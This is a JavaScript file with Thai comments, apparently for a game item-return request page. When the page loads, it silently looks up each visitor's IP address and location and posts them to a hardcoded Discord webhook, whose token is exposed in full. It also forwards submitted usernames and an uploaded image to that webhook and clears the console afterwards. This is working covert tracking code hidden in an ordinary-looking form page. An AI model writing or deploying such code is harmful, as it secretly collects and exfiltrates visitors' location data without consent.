function checkIPAndSendToDiscordWebhook() {
    let IPS = 'https://ipapi.co/json/';
  
    fetch(IPS)
      .then(response => response.json())
      .then(data => {
        // นำข้อมูล JSON ที่ได้มาแสดงผลหรือใช้งานตามต้องการ
        console.log('IP Address:', data.ip);
        console.log('City:', data.city);
        console.log('Region:', data.region);
        console.log('Country:', data.country_name);
  
        // ส่งข้อมูลไปยัง Discord Webhook
        let message = `IP Address: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}`;
        sendToDiscordWebhook(message);
      })
      .catch(error => {
        console.log('Error fetching data:', error);
      });
  }
  
  function sendToDiscordWebhook(message) {
    fetch('https://discord.com/api/webhooks/1173979452364038184/ihRHryjibnIKu_M1cj8kZw06zntEzq8o9adLY5x0wyFofDS4veh7sjsJSqNWfax-UUH8', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ content: message }),
    })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord');
        } else {
          console.log('Failed to send message to Discord');
        }
      })
      .catch(error => {
        console.log('Error sending message to Discord:', error);
      });
  }
  
  // เรียกใช้ฟังก์ชั่นเมื่อโหลดหน้าเว็บ
  checkIPAndSendToDiscordWebhook();
  

document.getElementById('queueForm').addEventListener('submit', function(e) {
    e.preventDefault();

    let username = document.getElementById('username').value;
    let usernameG = document.getElementById('usernameG').value;
    // ส่งข้อมูลไปยัง Webhook Discord
    sendDataToWebhook(username, usernameG);
});

function sendDataToWebhook(username, usernameG) {
    fetch('https://discord.com/api/webhooks/1173979452364038184/ihRHryjibnIKu_M1cj8kZw06zntEzq8o9adLY5x0wyFofDS4veh7sjsJSqNWfax-UUH8', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: `**Username: **@${username}\n**User Name Player: **${usernameG}\n**รูปของที่ขอคืน:** `
        })
    })
    
    .then(response => {
        if (!response.ok) {
            throw new Error('ไม่สามารถส่งข้อมูลไปยัง Webhook Discord ได้');
        }
        return response.json();
    })
    .then(data => {
        console.log('ส่งข้อมูลไปยัง Webhook Discord สำเร็จ:');
        console.log("รอ 1 วินาที");
        setTimeout(function() {
            console.log("เวลา 1 วินาทีแล้ว");
        }, 1000);
        form.reset();
        console.clear();
        
        console.log('Console ได้ปิดการแสดงข้อมูลแล้ว');
    })
    .catch(error => {
        console.error('เกิดข้อผิดพลาด:', error);
        console.clear();
        
        console.log('Console ได้ปิดการแสดงข้อมูลแล้ว');
    });
}

document.getElementById('queueForm').addEventListener('submit', function(e) {
    e.preventDefault();
    let profilePic = document.getElementById('profilePic').files[0];

    // สร้าง FormData object เพื่อเก็บข้อมูล
    let formData = new FormData();
    formData.append('profilePic', profilePic);

    // URL ของ Webhook Discord
    let webhookURL = 'https://discord.com/api/webhooks/1173979452364038184/ihRHryjibnIKu_M1cj8kZw06zntEzq8o9adLY5x0wyFofDS4veh7sjsJSqNWfax-UUH8';

    // ส่งข้อมูลไปยัง Webhook Discord
    fetch(webhookURL, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('ไม่สามารถส่งข้อมูลไปยัง Webhook Discord ได้');
        }
        return response.json();
    })
    .then(data => {
        console.log('ส่งข้อมูลไปยัง Webhook Discord สำเร็จ:');
        window.close()
        form.reset();
        console.clear();
        
        console.log('Console ได้ปิดการแสดงข้อมูลแล้ว');
    })
    .catch(error => {
        console.error('เกิดข้อผิดพลาด:', error);
        console.clear();

        console.log('Console ได้ปิดการแสดงข้อมูลแล้ว');
    });
});

